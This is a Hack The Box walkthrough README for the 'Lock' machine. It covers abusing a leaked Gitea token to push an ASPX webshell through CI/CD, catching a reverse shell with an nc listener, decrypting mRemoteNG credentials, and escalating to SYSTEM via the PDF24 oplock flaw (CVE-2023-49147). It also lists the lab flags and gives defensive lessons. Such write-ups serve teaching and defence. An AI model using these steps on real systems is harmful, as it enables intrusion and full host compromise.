README.md (complete)
# Lock – Hack The Box Walkthrough  

**Machine:** `Lock` | **IP:** `10.129.234.64` | **Domain:** `lock.htb`  

> *All commands were run from a Kali Linux workstation unless otherwise noted.*

---

## Table of Contents
1. [Enumeration](#enumeration)  
2. [Initial Access – Gitea CI/CD Abuse](#initial-access)  
3. [Privilege Escalation – PDF24 Creator (CVE‑2023‑49147)](#privilege-escalation)  
4. [Flags](#flags)  
5. [Lessons Learned](#lessons-learned)  
6. [References](#references)  

---

## Enumeration  

| Step | Command / Observation | Notes |
|------|-----------------------|-------|
| **Port Scan** | `nmap -sC -sV lock.htb` | Open ports: `80/tcp (http)`, `3000/tcp (Gitea)` |
| **Web Server** | `curl -I http://lock.htb/` | ASP.NET server header |
| **Gitea UI** | `http://lock.htb:3000` | Public repo *dev‑scripts* (Python script + comments) |
| **Git History** | `git log` → locate commit containing `GITEA_ACCESS_TOKEN` | Token: `43ce39bb0bd6bc489284f2905f033ca467a6362f` |
| **API Enumeration** | `python3 repos.py lock.htb` (uses env var `GITEA_ACCESS_TOKEN`) | Lists additional private repo `ellen.freeman/website` |

---

## Initial Access – Gitea CI/CD Abuse  

1. **Clone the vulnerable repo**  

   ```bash
   git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.htb:3000/ellen.freeman/website.git
   cd website
Copy
Add a webshell – grabbed ASPX webshell from GitHub (webshell-LT.aspx) and renamed it webshell.aspx.

Commit & push

git add webshell.aspx
git commit -m "add webshell"
git push
Copy
Trigger CI/CD – the pipeline auto‑redeploys on each push, publishing webshell.aspx to http://lock.htb/webshell.aspx.

Obtain a reverse shell – served a PowerShell reverse‑shell payload (from revshells.com).

# Listener on attacker machine
rlwrap nc -lvnp 4444
Copy
Result: interactive shell as user ellen.freeman.

Privilege Escalation – PDF24 Creator (CVE‑2023‑49147)
While exploring the user’s profile we discovered:

config.xml (mRemoteNG) containing an encrypted RDP credential for user Gale.Dekarios.
Decrypted password (ty8wnW9qCKDosXo6) using the public mremoteng-decrypt tool.
RDP access to the host as Gale.Dekarios.
Steps to become SYSTEM
RDP into the box with the recovered credentials

xfreerdp3 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /v:10.129.139.121 /size:1280x720 /tls:seclevel:0 /cert:ignore
Copy
Identify installed PDF24 Creator – version 11.15.1 (vulnerable).

Download SetOpLock utility (Google Project Zero symbolic‑link testing tools) onto the RDP session.

Invoke-WebRequest -Uri https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/.../SetOpLock.exe -OutFile SetOpLock.exe
Copy
Create an opportunistic lock on the PDF24 log file

.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log"
Copy
The installer’s repair routine (msiexec /fa pdf24-creator.msi) spawns pdf24-PrinterInstall.exe as SYSTEM, which tries to write to the locked log file, leaving a SYSTEM‑level cmd.exe window hanging.

Interact with the hanging SYSTEM console and spawn a SYSTEM shell

# Inside the opened cmd window
whoami          # => nt authority\system
Copy
Read the root flag

type C:\Users\Administrator\Desktop\root.txt
Copy
Result: Full root (SYSTEM) compromise.

Flags
Level	Flag
User	HTB{3e2d99bad2f8025d1e9037829cf75da0} (captured from C:\Users\gale.dekarios\Desktop\user.txt)
Root	HTB{a5397a3299e8f19f20dbb30e976f6f59} (captured from C:\Users\Administrator\Desktop\root.txt)

Lessons Learned
Area	Takeaway
CI/CD Trust Boundaries	Automated deployment pipelines that pull directly from a VCS are powerful, but they also trust anything committed. Never allow unauthenticated or low‑privilege contributors to push code that reaches production without code‑review or signing.
Secret Management	Storing API tokens, passwords, or any secrets in plain text (e.g., Gitea access token in a commit) is a critical mistake. Use environment variables, secret vaults, or at least rotate tokens regularly.
Service Enumeration	Simple header checks (curl -I) revealed the backend framework (ASP.NET). Knowing the tech stack narrows down useful exploits (e.g., webshells targeting ASPX).
Privilege‑Escalation Hygiene	Keeping software up‑to‑date matters. PDF24 Creator’s vulnerability was patched in v11.15.2; the target still ran the vulnerable 11.15.1 version. Regular patch management can close this attack vector.
Opportunistic Locks (Oplocks)	Oplocks are a lesser‑known Windows feature that can be abused for privilege escalation. Understanding low‑level OS mechanisms can yield creative post‑exploitation paths.
Credential Dumping via Config Files	Tools like mremoteng-decrypt demonstrate that many GUI applications store credentials locally. Always audit configuration files for embedded secrets after gaining footholds.
Defense‑in‑Depth	Relying on a single layer (e.g., network segmentation) isn’t enough. Combining host‑based IDS, file integrity monitoring, and strict least‑privilege policies would have mitigated several steps of this chain.
References
PDF24 Creator Privilege Escalation – CVE‑2023‑49147 – NVD
PDF24 changelog – fix introduced in v11.15.2
Google Project Zero – SymbolicLink Testing Tools (SetOpLock)
mRemoteNG credential decryption – mremoteng-decrypt GitHub repo
Hack The Box – Lock machine write‑ups (community)
Prepared by InkSec – Your source for practical offensive security write‑ups.